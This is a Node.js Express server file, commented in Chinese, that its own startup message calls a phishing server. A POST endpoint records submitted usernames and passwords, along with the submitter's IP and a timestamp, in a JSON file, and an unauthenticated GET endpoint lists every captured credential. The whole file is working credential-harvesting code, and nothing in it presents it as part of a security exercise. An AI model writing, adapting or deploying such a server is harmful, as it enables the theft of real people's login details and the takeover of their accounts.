const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;

// 中间件
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// 存储捕获的凭据
const credentialsPath = path.join(__dirname, 'captured_credentials.json');

// 创建捕获凭据的端点
app.post('/api/capture', (req, res) => {
    const { username, password } = req.body;
    
    // 简单验证
    if (!username || !password) {
        return res.status(400).json({ message: '缺少用户名或密码' });
    }
    
    // 读取现有凭据（如果存在）
    let credentials = [];
    if (fs.existsSync(credentialsPath)) {
        const data = fs.readFileSync(credentialsPath, 'utf8');
        credentials = JSON.parse(data);
    }
    
    // 添加新凭据
    credentials.push({
        username,
        password,
        timestamp: new Date().toISOString(),
        ip: req.ip
    });
    
    // 保存捕获的凭据
    fs.writeFileSync(credentialsPath, JSON.stringify(credentials, null, 2));
    
    // 返回成功响应
    res.json({ success: true });
});

// 查看捕获的凭据
app.get('/api/credentials', (req, res) => {
    if (!fs.existsSync(credentialsPath)) {
        return res.json([]);
    }
    
    const data = fs.readFileSync(credentialsPath, 'utf8');
    const credentials = JSON.parse(data);
    
    res.json(credentials);
});

// 启动服务器
app.listen(port, () => {
    console.log(`钓鱼服务器运行在 http://localhost:${port}`);
}); 